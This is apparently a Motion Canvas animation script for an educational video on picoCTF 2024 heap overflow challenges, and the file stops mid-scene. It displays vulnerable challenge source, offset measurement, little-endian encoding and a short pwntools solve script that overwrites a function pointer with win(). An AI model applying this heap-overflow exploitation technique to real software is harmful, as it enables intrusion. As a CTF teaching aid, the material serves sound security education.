import {Line, Node, Rect, Txt, makeScene2D} from '@motion-canvas/2d';
import {
  all,
  createRef,
  createSignal,
  easeInOutCubic,
  easeOutCubic,
  sequence,
  waitFor,
} from '@motion-canvas/core';
import {
  cameraTravel,
  cascadeIn,
  drawPaths,
  trackedPoints,
  sweep,
} from '../../motion-repertoire/motion-canvas/src';
import {HouseCaption} from './HouseCaption';
import {C, MONO, SANS} from './theme';

type Tone = 'mint' | 'secondary' | 'amber' | 'coral' | 'muted' | 'ink';

const color = (tone: Tone = 'ink') => C[tone];
const codeRows = (start: number, rows: string[]) => rows.map((text, index) => ({number: start + index, text}));

function Label({
  text,
  x = 0,
  y = 0,
  tone = 'muted',
  size = 20,
  width = 600,
  align = 'left',
}: {
  text: any;
  x?: number;
  y?: number;
  tone?: Tone;
  size?: number;
  width?: number;
  align?: 'left' | 'center' | 'right';
}) {
  return (
    <Txt
      text={text}
      x={x}
      y={y}
      width={width}
      offsetX={align === 'left' ? -1 : align === 'right' ? 1 : 0}
      textAlign={align}
      fill={color(tone)}
      fontFamily={MONO}
      fontSize={size}
      fontWeight={700}
      letterSpacing={size < 26 ? 0.6 : 0}
    />
  );
}

function Chip({
  text,
  x = 0,
  y = 0,
  tone = 'mint',
  width = 220,
  height = 52,
  ref,
}: {
  text: string;
  x?: number;
  y?: number;
  tone?: Tone;
  width?: number;
  height?: number;
  ref?: any;
  key?: string | number;
}) {
  return (
    <Rect ref={ref} x={x} y={y} width={width} height={height} radius={12} fill={C.raised} stroke={color(tone)} lineWidth={2}>
      <Txt text={text} fill={color(tone)} fontFamily={MONO} fontSize={20} fontWeight={780} />
    </Rect>
  );
}

function Terminal({
  title = 'terminal',
  context,
  lines,
  x = 0,
  y = 0,
  width = 1500,
  height = 700,
  active,
  ref,
}: {
  title?: string;
  context?: string;
  lines: {text: string; tone?: Tone; prompt?: boolean}[];
  x?: number;
  y?: number;
  width?: number;
  height?: number;
  active?: () => number;
  ref?: any;
}) {
  const rowHeight = Math.min(50, (height - 94) / Math.max(1, lines.length));
  return (
    <Rect ref={ref} x={x} y={y} width={width} height={height} radius={20} fill={C.panel} stroke={C.rule} lineWidth={2} clip>
      <Rect y={-height / 2 + 33} width={width} height={66} fill={C.raised} />
      <Rect x={-width / 2 + 18} y={-height / 2 + 33} width={6} height={40} radius={3} fill={C.mint} />
      <Label text={title} x={-width / 2 + 48} y={-height / 2 + 33} width={width * 0.55} tone="ink" size={22} />
      {context ? <Label text={context} x={width / 2 - 38} y={-height / 2 + 33} width={width * 0.35} tone="muted" size={17} align="right" /> : null}
      {lines.map((line, index) => {
        const scope = `${title}|${context ?? 'ctx'}`;
        return (
        <Rect
          key={`terminal-line-${scope}-${index}`}
          y={-height / 2 + 91 + index * rowHeight}
          width={width - 54}
          height={rowHeight - 4}
          radius={6}
          fill={() => active?.() === index ? '#263C2CCC' : '#00000000'}
        >
          {line.prompt ? <Label text="$" x={-width / 2 + 34} y={0} width={28} tone="mint" size={25} /> : null}
          <Label
            text={line.text}
            x={-width / 2 + (line.prompt ? 76 : 36)}
            y={0}
            width={width - (line.prompt ? 112 : 72)}
            tone={line.tone ?? 'ink'}
            size={Math.min(28, rowHeight * 0.6)}
          />
        </Rect>
      )})}
    </Rect>
  );
}

function SourcePanel({
  title = 'chall.c',
  rows,
  x = 0,
  y = 0,
  width = 1540,
  height = 770,
  active,
  ref,
  breadcrumb,
}: {
  title?: string;
  rows: {number: number; text: string; tone?: Tone}[];
  x?: number;
  y?: number;
  width?: number;
  height?: number;
  active?: () => number;
  ref?: any;
  breadcrumb?: string;
}) {
  const rowHeight = Math.min(46, (height - 118) / Math.max(1, rows.length));
  return (
    <Rect ref={ref} x={x} y={y} width={width} height={height} radius={20} fill={C.panel} stroke={C.rule} lineWidth={2} clip>
      <Rect y={-height / 2 + 33} width={width} height={66} fill={C.raised} />
      <Rect x={-width / 2 + 18} y={-height / 2 + 33} width={6} height={40} radius={3} fill={C.mint} />
      <Label text={title} x={-width / 2 + 48} y={-height / 2 + 33} width={width * 0.43} tone="ink" size={22} />
      <Label text={breadcrumb ?? 'source evidence'} x={width / 2 - 34} y={-height / 2 + 33} width={width * 0.48} tone="muted" size={16} align="right" />
      <Rect x={-width / 2 + 92} y={34} width={2} height={height - 66} fill={C.rule} />
      {rows.map((row, index) => {
        const scope = `${title}|${breadcrumb ?? 'ctx'}`;
        return (
        <Rect
          key={`source-row-${scope}-${row.number}-${index}`}
          y={-height / 2 + 91 + index * rowHeight}
          width={width - 42}
          height={rowHeight - 4}
          radius={6}
          fill={() => active?.() === index ? '#4D3420CC' : '#00000000'}
        >
          <Label text={String(row.number).padStart(2, '0')} x={-width / 2 + 68} y={0} width={52} align="right" tone="muted" size={18} />
          <Label
            text={row.text}
            x={-width / 2 + 122}
            y={0}
            width={width - 160}
            tone={row.tone ?? 'ink'}
            size={Math.min(row.text.length > 46 ? 22 : 29, rowHeight * 0.62)}
          />
        </Rect>
      )})}
    </Rect>
  );
}

function Byte({
  value,
  x,
  y,
  tone = 'mint',
  ref,
  width = 78,
  height = 70,
  opacity = 1,
}: {
  value: string;
  x: number;
  y: number;
  tone?: Tone;
  ref?: any;
  width?: number;
  height?: number;
  opacity?: number;
  key?: string | number;
}) {
  return (
    <Rect ref={ref} x={x} y={y} width={width} height={height} radius={10} fill={C.raised} stroke={color(tone)} lineWidth={2} opacity={opacity}>
      <Txt text={value} fill={color(tone)} fontFamily={MONO} fontSize={26} fontWeight={800} />
    </Rect>
  );
}

function Chunk({
  x,
  y,
  label,
  address,
  values,
  tone = 'mint',
  ref,
  metadata = true,
}: {
  x: number;
  y: number;
  label: string;
  address: string;
  values: string[];
  tone?: Tone;
  ref?: any;
  metadata?: boolean;
}) {
  const width = 560;
  const cellWidth = (width - 42) / values.length;
  return (
    <Rect ref={ref} x={x} y={y} width={width} height={218} radius={18} fill={C.panel} stroke={color(tone)} lineWidth={3}>
      <Label text={label} x={-width / 2 + 24} y={-76} width={260} tone={tone} size={25} />
      <Label text={address} x={width / 2 - 22} y={-76} width={230} tone="muted" size={17} align="right" />
      {metadata ? <Rect x={-width / 2 + 21} y={-28} width={width - 42} height={32} radius={6} fill={'#26332B'}>
        <Label text="allocator header · dim context" x={-width / 2 + 37} y={0} width={300} tone="muted" size={15} />
      </Rect> : null}
      {values.map((value, index) => (
        <Byte
          key={`chunk-byte-${label}-${index}`}
          value={value}
          x={-width / 2 + 21 + cellWidth / 2 + index * cellWidth}
          y={44}
          width={cellWidth - 7}
          height={66}
          tone={tone}
        />
      ))}
    </Rect>
  );
}

function Topbar({chapter}: {chapter: any}) {
  return (
    <Node>
      <Label text={() => chapter()} x={-830} y={-485} width={900} tone="muted" size={18} />
      <Label text="picoCTF 2024 · heap 1 / heap 2 / heap 3" x={830} y={-485} width={900} tone="muted" size={18} align="right" />
      <Rect y={-449} width={1700} height={2} fill={C.rule} />
    </Node>
  );
}

function* fadeOut(node: Node, camera: Node) {
  yield* all(node.opacity(0, 0.68, easeOutCubic), camera.position([0, 0], 0.68), camera.scale(1, 0.68));
  node.remove();
}

function* scan(node: Rect, points: number[], duration = 0.54) {
  for (const y of points) yield* node.position.y(y, duration, easeInOutCubic);
}

export default makeScene2D(function* (view) {
  view.fill(C.canvas);
  const camera = createRef<Node>();
  const chapter = createSignal('00:00 · COLD OPEN');
  const caption = createSignal('');
  view.add(<><Node ref={camera} /><Topbar chapter={chapter} /><HouseCaption text={caption} /></>);

  // 0:00–0:18 · cold open
  chapter('00:00 · COLD OPEN');
  caption('The heap is a neighborhood.');
  const cold = createRef<Node>();
  const overflow = createRef<Rect>();
  const underflow = createRef<Rect>();
  const stack = createRef<Rect>();
  const rooms: Rect[] = [];
  camera().add(
    <Node ref={cold}>
      <Label text="0x...2b0" x={-540} y={-260} width={260} tone="muted" size={23} align="center" />
      <Label text="0x...2d0" x={0} y={-260} width={260} tone="muted" size={23} align="center" />
      <Label text="0x...2f0" x={540} y={-260} width={260} tone="muted" size={23} align="center" />
      {['input_data', 'x', 'next chunk'].map((name, index) => (
        <Rect
          key={`cold-room-${name}`}
          ref={node => rooms[index] = node}
          x={-540 + index * 540}
          y={-35}
          width={370}
          height={350}
          radius={22}
          fill={C.panel}
          stroke={index === 1 ? C.amber : C.rule}
          lineWidth={3}
        >
        <Label text={name} x={-145} y={-130} width={280} tone={index === 1 ? 'amber' : 'mint'} size={28} />
        <Rect y={40} width={310} height={120} radius={14} fill={C.raised} />
      </Rect>
      ))}
      <Rect ref={stack} x={770} y={35} width={190} height={520} radius={18} fill={C.raised} stroke={C.muted} lineWidth={2}>
        <Label text="STACK" y={-205} width={160} tone="muted" size={19} align="center" />
      </Rect>
      <Rect ref={overflow} x={-540} y={38} width={58} height={58} radius={10} fill={C.coral}>
        <Txt text="▦" fill={C.canvas} fontFamily={MONO} fontSize={30} fontWeight={800} />
      </Rect>
      <Rect ref={underflow} x={0} y={160} width={58} height={58} radius={10} fill={C.coral} opacity={0}>
        <Txt text="▦" fill={C.canvas} fontFamily={MONO} fontSize={30} fontWeight={800} />
      </Rect>
      <Label text="HEAP OVERFLOW" y={320} width={900} tone="coral" size={62} align="center" />
    </Node>,
  );
  yield* cascadeIn(rooms, 0.12, 0.55);
  yield* all(stack().opacity(0.25, 0.7), stack().position.x(860, 0.7), overflow().position.x(0, 1.8, easeInOutCubic));
  caption('No bound stops the write.');
  yield* overflow().position.x(540, 1.3, easeInOutCubic);
  yield* all(overflow().opacity(0, 0.35), underflow().opacity(1, 0.35), underflow().position.x(-540, 1.4, easeInOutCubic));
  caption('Underflow crosses left.');
  yield* waitFor(8.2);
  yield* fadeOut(cold(), camera());

  // 0:18–0:55 · artifact context
  chapter('00:18 · THE CRIME SCENE');
  caption('Start with the actual artifact.');
  const crime = createRef<Node>();
  const terminalActive = createSignal(-1);
  const sourceActive = createSignal(-1);
  camera().add(<Node ref={crime}>
    <Terminal x={-365} y={-30} width={970} height={620} title="terminal" context="local evidence" active={() => terminalActive()} lines={[
      {text: 'ls -la evidence/', prompt: true, tone: 'mint'},
      {text: 'heap1-chall  heap1-chall.c  heap2-chall  heap2-chall.c', tone: 'secondary'},
      {text: 'file evidence/heap2-chall', prompt: true, tone: 'mint'},
      {text: 'ELF 64-bit LSB executable, x86-64, not stripped', tone: 'secondary'},
      {text: 'readelf -h evidence/heap2-chall', prompt: true, tone: 'mint'},
      {text: 'Class: ELF64   Data: 2\'s complement, little endian', tone: 'secondary'},
      {text: 'checksec --file=evidence/heap2-chall', prompt: true, tone: 'mint'},
      {text: 'checksec: command not found  (not fabricated)', tone: 'coral'},
    ]} />
    <SourcePanel x={560} y={-30} width={700} height={620} title="heap2-chall.c" breadcrumb="complete-source pass" active={() => sourceActive()} rows={codeRows(1, [
      '#include <stdio.h>', '#include <stdlib.h>', 'char *x;', 'char *input_data;', '', 'void win() { … }', 'void check_win() { ((void (*)())*(int*)x)(); }', '', 'void init() { … }', 'void write_buffer() { … }', 'void print_heap() { … }', 'int main(void) { … }',
    ])} />
    <Line points={[[-40, 340], [370, 340]]} stroke={C.mint} lineWidth={4} endArrow arrowSize={16} end={0} />
  </Node>);
  yield* all(crime().opacity(0, 0), crime().position.y(35, 0));
  yield* all(crime().opacity(1, 0.7), crime().position.y(0, 0.7));
  terminalActive(0); yield* waitFor(3.8); terminalActive(2); yield* waitFor(3.8); terminalActive(4); yield* waitFor(3.8); terminalActive(6);
  caption('Full source first. Then close-up.');
  sourceActive(0);
  for (const row of [2, 3, 5, 6, 8, 9, 10, 11]) { sourceActive(row); yield* waitFor(2.35); }
  yield* waitFor(1.5);
  yield* fadeOut(crime(), camera());

  // 0:55–1:32 · normal execution
  chapter('00:55 · NORMAL EXECUTION');
  caption('A normal run reveals two addresses.');
  const normal = createRef<Node>();
  const ruler = createRef<Line>();
  camera().add(<Node ref={normal}>
    <Terminal y={-70} width={1500} height={680} title="./evidence/heap2-chall" context="captured local run" lines={[
      {text: 'I have a function, I sometimes like to call it, maybe you should change it', tone: 'muted'},
      {text: 'Enter your choice: 1', prompt: true, tone: 'mint'},
      {text: '[*]   Address   ->   Value', tone: 'muted'},
      {text: '[*]   0x1896c020  ->   pico', tone: 'secondary'},
      {text: '[*]   0x1896c040  ->   bico', tone: 'amber'},
      {text: 'ASLR changes absolute addresses; this is one captured run.', tone: 'muted'},
    ]} />
    <Line ref={ruler} points={[[-318, 250], [315, 250]]} stroke={C.amber} lineWidth={5} startArrow endArrow arrowSize={16} end={0} />
    <Chip text="0x...c040 − 0x...c020 = 0x20 = 32" y={350} width={760} tone="amber" />
  </Node>);
  normal().opacity(0); normal().scale(0.94);
  yield* all(normal().opacity(1, 0.65), normal().scale(1, 0.65));
  yield* ruler().end(1, 1.4);
  caption('Measured: 0x20 = 32 bytes.');
  yield* cameraTravel(camera(), 'push', 1.2);
  yield* waitFor(31.75);
  yield* fadeOut(normal(), camera());

  // 1:32–2:18 · init owns two chunks
  chapter('01:32 · WHO OWNS THE HEAP?');
  caption('Names label chunks. They are not walls.');
  const owner = createRef<Node>();
  const ownerActive = createSignal(-1);
  const inputChunk = createRef<Rect>();
  const xChunk = createRef<Rect>();
  const ownerLine = createRef<Line>();
  camera().add(<Node ref={owner}>
    <SourcePanel x={-410} y={-50} width={880} height={660} title="heap2-chall.c" breadcrumb="init() · real source" active={() => ownerActive()} rows={codeRows(30, [
      'void init() {', '  input_data = malloc(5);', '  strncpy(input_data, "pico", 5);', '  x = malloc(5);', '  strncpy(x, "bico", 5);', '}', '', 'void write_buffer() {', '  scanf("%s", input_data);', '}',
    ])} />
    <Chunk ref={inputChunk} x={500} y={-175} label="input_data" address="0x...c020" values={['p', 'i', 'c', 'o', '\\0']} tone="mint" />
    <Chunk ref={xChunk} x={500} y={145} label="x" address="0x...c040" values={['b', 'i', 'c', 'o', '\\0']} tone="amber" />
    <Line ref={ownerLine} points={trackedPoints(() => inputChunk(), () => xChunk())} stroke={C.amber} lineWidth={4} endArrow arrowSize={14} end={0} />
    <Chip text="requested: 5 bytes" x={500} y={390} width={290} tone="mint" />
    <Chip text="observed spacing: 0x20" x={820} y={390} width={330} tone="amber" />
  </Node>);
  owner().opacity(0); owner().position.x(-80);
  yield* all(owner().opacity(1, 0.7), owner().position.x(0, 0.7));
  ownerActive(1); yield* waitFor(4.1); ownerActive(3); yield* waitFor(4.1);
  yield* ownerLine().end(1, 1.1);
  caption('Code + terminal build the heap map.');
  ownerActive(8); yield* waitFor(34.0);
  yield* fadeOut(owner(), camera());

  // 2:18–3:08 · allocation geometry
  chapter('02:18 · MALLOC IS A LANDLORD');
  caption('malloc returns an address, not privacy.');
  const landlord = createRef<Node>();
  const byteCells: Rect[] = [];
  camera().add(<Node ref={landlord}>
    <Label text="heap chunk geometry · conceptual allocator view" y={-330} width={1200} tone="muted" size={22} align="center" />
    <Rect x={-485} y={0} width={340} height={320} radius={18} fill={C.panel} stroke={C.rule} lineWidth={2}><Label text="chunk header" y={-96} width={280} tone="muted" size={26} align="center" /><Label text="size · flags" y={0} width={280} tone="muted" size={22} align="center" /></Rect>
    <Rect x={-80} y={0} width={470} height={320} radius={18} fill={C.panel} stroke={C.mint} lineWidth={3}><Label text="input_data user area" y={-96} width={400} tone="mint" size={28} align="center" />{['p','i','c','o','\\0'].map((v,i)=><Byte key={`landlord-byte-${i}`} ref={node => byteCells[i] = node} value={v} x={-160+i*80} y={0} width={66} height={66} tone="mint" />)}</Rect>
    <Rect x={455} y={0} width={340} height={320} radius={18} fill={C.panel} stroke={C.rule} lineWidth={2}><Label text="next header" y={-96} width={280} tone="muted" size={26} align="center" /><Label text="allocator tracks it" y={0} width={280} tone="muted" size={20} align="center" /></Rect>
    <Rect x={860} y={0} width={330} height={320} radius={18} fill={C.panel} stroke={C.amber} lineWidth={3}><Label text="x user area" y={-96} width={280} tone="amber" size={28} align="center" /><Label text="b i c o \\0" y={0} width={260} tone="amber" size={28} align="center" /></Rect>
    <Line points={[[-80, 240], [860, 240]]} stroke={C.amber} lineWidth={5} startArrow endArrow arrowSize={16} />
    <Chip text="distance to neighbor's user data: 32 bytes" y={350} width={800} tone="amber" />
  </Node>);
  landlord().opacity(0); landlord().scale(0.9);
  yield* all(landlord().opacity(1, 0.7), landlord().scale(1, 0.7));
  yield* cascadeIn(byteCells, 0.18, 0.4);
  caption('Five bytes requested. 0x20 observed.');
  yield* cameraTravel(camera(), 'track-right', 1.1);
  yield* waitFor(42.4);
  yield* fadeOut(landlord(), camera());

  // 3:08–4:05 · vulnerable scanf
  chapter('03:08 · THE VULNERABLE LINE');
  caption('%s stops at whitespace—not the buffer.');
  const vulnerable = createRef<Node>();
  const writeActive = createSignal(-1);
  const mouth = createRef<Rect>();
  const stream: Rect[] = [];
  camera().add(<Node ref={vulnerable}>
    <SourcePanel y={-120} width={1500} height={490} title="chall.c" breadcrumb="reached from menu option 2 · write_buffer()" active={() => writeActive()} rows={codeRows(42, [
      'void write_buffer() {', '  printf("Data for buffer: ");', '  fflush(stdout);', '  scanf("%s", input_data);', '}',
    ])} />
    <Rect ref={mouth} x={-600} y={265} width={160} height={102} radius={18} fill={C.raised} stroke={C.amber} lineWidth={3}><Txt text="%s" fill={C.amber} fontFamily={MONO} fontSize={46} fontWeight={800} /></Rect>
    {Array.from({length: 13}, (_, index) => <Rect key={`stream-byte-${index}`} ref={node => stream[index] = node} x={-420 + index * 68} y={265} width={48} height={48} radius={8} fill={C.coral} opacity={0}><Txt text="A" fill={C.canvas} fontFamily={MONO} fontSize={25} fontWeight={800} /></Rect>)}
    <Chip text="write start = input_data" x={-340} y={405} width={390} tone="mint" />
    <Chip text="write end = first whitespace" x={80} y={405} width={430} tone="amber" />
    <Chip text="bounds = none" x={510} y={405} width={270} tone="coral" />
  </Node>);
  vulnerable().opacity(0); yield* vulnerable().opacity(1, 0.65);
  writeActive(3); yield* cameraTravel(camera(), 'push', 1.1);
  yield* cascadeIn(stream, 0.09, 0.28);
  yield* all(mouth().stroke(C.coral, 0.8), stream[6].position.y(190, 0.8));
  caption('%s does not see malloc(5).');
  yield* waitFor(47.2);
  yield* fadeOut(vulnerable(), camera());

  // 4:05–5:12 · heap 1 warmup
  chapter('04:05 · HEAP 1 — DATA CORRUPTION');
  caption('Overwrite a neighboring decision.');
  const heapOne = createRef<Node>();
  const payloadCells: Rect[] = [];
  const safe = createRef<Rect>();
  camera().add(<Node ref={heapOne}>
    <Label text="heap 1 warm-up · same observed 0x20 neighborhood" y={-370} width={1300} tone="muted" size={22} align="center" />
    <Chunk x={-390} y={-40} label="input_data" address="0x...c020" values={['A','A','A','A','…']} tone="coral" />
    <Chunk ref={safe} x={390} y={-40} label="safe_var" address="0x...c040" values={['b','i','c','o','\\0']} tone="amber" />
    {Array.from({length: 8}, (_, index) => <Byte key={`payload-byte-${index}`} ref={node => payloadCells[index] = node} value={index < 4 ? 'A' : ['p','i','c','o'][index - 4]} x={-420 + index * 120} y={270} tone={index < 4 ? 'coral' : 'mint'} />)}
    <Line points={[[-420, 185], [390, 85]]} stroke={C.coral} lineWidth={5} endArrow arrowSize={18} />
    <Label text={'b"A" * 32 + b"pico"'} y={395} width={1000} tone="ink" size={34} align="center" />
  </Node>);
  heapOne().opacity(0); heapOne().position.y(55); yield* all(heapOne().opacity(1,0.7), heapOne().position.y(0,0.7));
  yield* cascadeIn(payloadCells, 0.1, 0.38);
  caption('32 fillers, then pico reaches safe_var.');
  yield* all(safe().stroke(C.mint, 1), safe().scale(1.04, 1));
  safe().removeChildren();
  safe().add(<><Label text="safe_var" x={-256} y={-76} width={260} tone="mint" size={25} /><Label text="0x...c040" x={256} y={-76} width={230} tone="muted" size={17} align="right" /><Label text="p  i  c  o  \\0" y={35} width={470} tone="mint" size={34} align="center" /></>);
  yield* waitFor(60.1);
  yield* fadeOut(heapOne(), camera());

  // 5:12–6:05 · quiet dangerous data corruption
  chapter('05:12 · QUIET CORRUPTION');
  caption('Data corruption can win before RIP.');
  const quiet = createRef<Node>();
  const fields: Rect[] = [];
  const values: Txt[] = [];
  const labels = ['role', 'paid', 'length', 'callback'];
  const before = ['guest', 'false', '16', 'clean_exit'];
  const after = ['admin', 'true', '4096', 'win'];
  camera().add(<Node ref={quiet}>
    {labels.map((name, index) => <Rect key={`quiet-field-${name}`} ref={node => fields[index] = node} x={-570 + (index % 2) * 760} y={-165 + Math.floor(index / 2) * 330} width={600} height={200} radius={20} fill={C.panel} stroke={C.rule} lineWidth={2}>
      <Label text={name} x={-250} y={-58} width={300} tone="muted" size={22} />
      <Txt ref={node => values[index] = node} text={before[index]} y={30} fill={C.ink} fontFamily={MONO} fontSize={42} fontWeight={800} />
    </Rect>)}
    <Line points={[[-850, 0], [820, 0]]} stroke={C.coral} lineWidth={5} endArrow arrowSize={18} end={0} />
  </Node>);
  quiet().opacity(0); yield* quiet().opacity(1, 0.65);
  for (let index = 0; index < 4; index++) {
    yield* all(fields[index].stroke(C.coral, 0.45), fields[index].scale(1.04, 0.45));
    values[index].text(after[index]);
    yield* all(fields[index].stroke(index === 3 ? C.amber : C.mint, 0.45), fields[index].scale(1, 0.45));
    yield* waitFor(5.4);
  }
  caption('A callback becomes control flow when trusted.');
  yield* all(fields[3].scale(1.12, 0.9), fields[0].opacity(0.2,0.9), fields[1].opacity(0.2,0.9), fields[2].opacity(0.2,0.9));
  yield* waitFor(27.4);
  yield* fadeOut(quiet(), camera());

  // 6:05–7:15 · check_win interpretation
  chapter('06:05 · HEAP 2 — A FUNCTION POINTER');
  caption('Bytes can become string, integer, then call.');
  const bridge = createRef<Node>();
  const bridgeActive = createSignal(-1);
  const layers: Rect[] = [];
  camera().add(<Node ref={bridge}>
    <SourcePanel x={-420} y={-45} width={860} height={610} title="heap2-chall.c" breadcrumb="check_win() · real source" active={() => bridgeActive()} rows={codeRows(14, [
      'void win() {', '  FILE *fd = fopen("flag.txt", "r");', '  fgets(buf, FLAGSIZE_MAX, fd);', '}', '', 'void check_win() { ((void (*)())*(int*)x)(); }', '', '… menu option 4 calls check_win() …',
    ])} />
    {[
      'x → points to bytes on heap',
      '(int*)x → treat bytes as an integer address',
      '*(int*)x → read stored integer value',
      '(void (*)()) → treat integer as callable address',
      '() → call it',
    ].map((text, index) => <Rect key={`bridge-layer-${index}-${text}`} ref={node => layers[index] = node} x={520} y={-245 + index * 118} width={790} height={82} radius={14} fill={C.raised} stroke={index === 4 ? C.coral : C.amber} lineWidth={2} opacity={0}>
      <Label text={text} x={-350} y={0} width={710} tone={index === 4 ? 'coral' : 'ink'} size={22} />
    </Rect>)}
    <Chip text="bico is not a valid function address" x={520} y={340} width={650} tone="coral" />
  </Node>);
  bridge().opacity(0); bridge().position.x(60); yield* all(bridge().opacity(1,0.7), bridge().position.x(0,0.7));
  bridgeActive(5); yield* cameraTravel(camera(), 'track-right',1.2);
  yield* sequence(0.22, ...layers.map(layer => layer.opacity(1, 0.45)));
  caption('x stores win → check_win calls it.');
  yield* all(layers[4].scale(1.08,0.8), layers[4].fill('#3B2020',0.8));
  yield* waitFor(63.0);
  yield* fadeOut(bridge(), camera());

  // 7:15–8:05 · objdump source of address
  chapter('07:15 · MEASURE THE DESTINATION');
  caption('Find win locally. Never copy blindly.');
  const symbol = createRef<Node>();
  const symbolActive = createSignal(-1);
  const address = createRef<Rect>();
  camera().add(<Node ref={symbol}>
    <Terminal y={-60} width={1550} height={610} title="terminal" context="real local artifact" active={() => symbolActive()} lines={[
      {text: "objdump -d ./evidence/heap2-chall | grep -E '<win>|<check_win>'", prompt: true, tone: 'mint'},
      {text: '00000000004011a0 <win>:', tone: 'amber'},
      {text: '00000000004011f0 <check_win>:', tone: 'secondary'},
      {text: 'source: objdump -d · not a guessed blog value', tone: 'muted'},
    ]} />
    <Rect ref={address} y={310} width={820} height={126} radius={18} fill={C.raised} stroke={C.amber} lineWidth={3} opacity={0}>
      <Label text="0x00000000004011a0" y={0} width={760} tone="amber" size={52} align="center" />
    </Rect>
  </Node>);
  symbol().opacity(0); symbol().scale(0.92); yield* all(symbol().opacity(1,0.65),symbol().scale(1,0.65));
  symbolActive(0); yield* waitFor(8);
  symbolActive(1); yield* all(address().opacity(1,0.8), address().scale(1.08,0.8));
  caption('0x4011a0 is the destination.');
  yield* address().scale(1,0.55);
  yield* waitFor(38.0);
  yield* fadeOut(symbol(), camera());

  // 8:05–9:05 · endianness
  chapter('08:05 · LITTLE ENDIAN');
  caption('Little-endian writes low byte first.');
  const endian = createRef<Node>();
  const human: Rect[] = [];
  const memory: Rect[] = [];
  camera().add(<Node ref={endian}>
    <Label text="human-readable address" y={-245} width={900} tone="muted" size={23} align="center" />
    {['00','00','00','00','00','40','11','a0'].map((value,index)=><Byte key={`human-byte-${index}`} ref={node=>human[index]=node} value={value} x={-420+index*120} y={-130} tone="amber" width={96} height={82} />)}
    <Label text="little-endian payload bytes" y={55} width={900} tone="muted" size={23} align="center" />
    {['a0','11','40','00','00','00','00','00'].map((value,index)=><Byte key={`memory-byte-${index}`} ref={node=>memory[index]=node} value={value} x={-420+index*120} y={165} tone="mint" width={96} height={82} opacity={0} />)}
    <Chunk x={0} y={390} label="x" address="heap bytes → function pointer" values={['a0','11','40','00','00','00','00','00']} tone="amber" metadata={false} />
  </Node>);
  endian().opacity(0); yield* endian().opacity(1,0.65);
  yield* cascadeIn(human,0.08,0.34);
  yield* sequence(0.08, ...memory.map((cell,index)=>all(cell.opacity(1,0.35), cell.position.x(-420+(7-index)*120,0.35))));
  caption('Raw bytes are an address in memory.');
  yield* waitFor(55.1);
  yield* fadeOut(endian(), camera());

  // 9:05–10:18 · build exploit
  chapter('09:05 · BUILD THE PAYLOAD');
  caption('Every payload byte needs evidence.');
  const build = createRef<Node>();
  const buildActive = createSignal(-1);
  const buildLines = [
    'from pwn import *', '', 'elf = ELF("./chall")', 'p = process("./chall")', '', 'win = elf.symbols["win"]', 'payload = b"A" * 32 + p64(win)', '', 'p.sendlineafter(b"choice:", b"2")', 'p.sendlineafter(b"buffer:", payload)', 'p.sendlineafter(b"choice:", b"4")', 'p.interactive()',
  ];
  camera().add(<Node ref={build}>
    <SourcePanel x={500} y={-50} width={900} height={760} title="solve.py" breadcrumb="strategy sketch · local constants" active={() => buildActive()} rows={codeRows(1, buildLines)} />
    <Chunk x={-500} y={-150} label="input_data → x" address="0x20 observed" values={['A','A','A','A','…','a0','11','40']} tone="coral" metadata={false} />
    <Rect x={-500} y={205} width={600} height={210} radius={18} fill={C.panel} stroke={C.rule} lineWidth={2}>
      <Label text="evidence threads" x={-255} y={-70} width={490} tone="muted" size={20} />
      <Label text="ELF() → binary\nsymbols[win] → objdump\nA × 32 → heap print\np64(win) → endian lane" x={-255} y={26} width={510} tone="ink" size={22} />
    </Rect>
    <Line points={[[-200,-50],[48,-50]]} stroke={C.mint} lineWidth={4} endArrow arrowSize={16} end={0} />
  </Node>);
  build().opacity(0); build().position.x(50); yield* all(build().opacity(1,0.65),build().position.x(0,0.65));
  for (const index of [2, 5, 6, 8, 9, 10, 11]) { buildActive(index); yield* waitFor(6.6); }
  caption('Filler reaches x; p64 replaces it.');
  yield* waitFor(24.15);
  yield* fadeOut(build(), camera());

  // 10:18–11:15 · exploitation without flag fabrication
  chapter('10:18 · CONTROL FLOW');
  caption('No local flag fixture. No fake success.');
  const execute = createRef<Node>();
  const rawX = createRef<Rect>();
  const callLine = createRef<Line>();
  camera().add(<Node ref={execute}>
    <Terminal x={-410} y={-80} width={860} height={620} title="./evidence/heap2-chall" context="real menu path" lines={[
      {text: 'Enter your choice: 2', prompt: true, tone: 'mint'},
      {text: 'Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA…', tone: 'coral'},
      {text: 'Enter your choice: 4', prompt: true, tone: 'mint'},
      {text: 'local proof: source + offset + symbol + raw bytes', tone: 'secondary'},
      {text: 'flag.txt fixture intentionally absent', tone: 'muted'},
    ]} />
    <Rect ref={rawX} x={470} y={-155} width={720} height={195} radius={18} fill={C.panel} stroke={C.amber} lineWidth={3}>
      <Label text="x after overwrite" x={-300} y={-58} width={500} tone="amber" size={22} />
      <Label text="a0 11 40 00 00 00 00 00" y={26} width={650} tone="amber" size={36} align="center" />
    </Rect>
    <Rect x={210} y={205} width={260} height={110} radius={16} fill={C.raised} stroke={C.coral} lineWidth={2}><Label text="check_win()" y={0} width={220} tone="coral" size={23} align="center" /></Rect>
    <Rect x={730} y={205} width={210} height={110} radius={16} fill={C.raised} stroke={C.mint} lineWidth={2}><Label text="win()" y={0} width={170} tone="mint" size={25} align="center" /></Rect>
    <Line ref={callLine} points={[[340,205],[625,205]]} stroke={C.coral} lineWidth={6} endArrow arrowSize={22} end={0} />
    <Label text="unbounded heap write + adjacent trusted pointer = control-flow corruption" y={388} width={1500} tone="ink" size={29} align="center" />
  </Node>);
  execute().opacity(0); yield* execute().opacity(1,0.65);
  yield* all(rawX().stroke(C.coral,0.8), rawX().scale(1.04,0.8));
  yield* callLine().end(1,1.15);
  caption('Bytes—not intent—drive execution.');
  yield* waitFor(52.3);
  yield* fadeOut(execute(), camera());

  // 11:15–12:20 · stack / heap comparison
  chapter('11:15 · STACK VS HEAP');
  caption('Stack goes up. Heap goes sideways.');
  const comparison = createRef<Node>();
  const stackArrow = createRef<Line>();
  const heapArrow = createRef<Line>();
  camera().add(<Node ref={comparison}>
    <Label text="STACK" x={-480} y={-335} width={500} tone="amber" size={30} align="center" />
    {['local buffer','saved rbp','return address'].map((label,index)=><Rect key={`stack-label-${index}-${label}`} x={-480} y={175-index*150} width={480} height={115} radius={15} fill={C.panel} stroke={index===2?C.amber:C.rule} lineWidth={2}><Label text={label} y={0} width={420} tone={index===2?'amber':'ink'} size={24} align="center" /></Rect>)}
